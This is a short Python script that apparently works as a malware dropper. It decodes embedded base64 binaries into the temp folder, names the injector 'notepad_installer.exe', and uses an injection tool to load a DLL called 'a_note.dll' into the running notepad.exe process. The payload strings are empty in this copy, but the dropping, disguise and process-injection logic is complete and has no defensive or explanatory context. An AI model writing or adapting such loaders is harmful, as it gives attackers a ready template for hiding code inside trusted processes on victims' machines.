import base64
import os
import tempfile


TEMPDIR = tempfile.gettempdir()
INJECTOR_PATH = os.path.join(TEMPDIR, 'notepad_installer.exe')
A_NOTE_PATH = os.path.join(TEMPDIR, 'a_note.dll')
injectallthings_exe = b''
a_note_dll = b''
command = r'{} -t 7 notepad.exe {}'.format(INJECTOR_PATH, A_NOTE_PATH)


def main():
	with open(INJECTOR_PATH, 'wb') as f:
		f.write(base64.b64decode(injectallthings_exe))

	with open(A_NOTE_PATH, 'wb') as f:
		f.write(base64.b64decode(a_note_dll))

	os.system(command)


if __name__ == '__main__':
	main()